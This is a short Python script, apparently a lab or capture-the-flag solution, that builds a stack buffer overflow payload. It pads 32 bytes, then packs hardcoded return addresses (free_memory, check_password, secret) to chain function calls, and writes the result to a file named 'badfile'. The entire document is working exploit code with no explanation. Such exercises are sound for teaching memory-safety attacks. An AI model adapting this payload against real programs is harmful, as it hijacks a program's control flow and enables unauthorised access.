import struct 

free_memory = 0x804858b
check_password = 0x8048661
secret = 0x804b410

atk_vector = 'a'*32
atk_vector += struct.pack('I', free_memory)
atk_vector += struct.pack('I', check_password) #eip of free_memory
atk_vector += struct.pack('I', secret) #secret of free_memory #eip of check_password
atk_vector += struct.pack('I', secret) #secret of check_password


f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

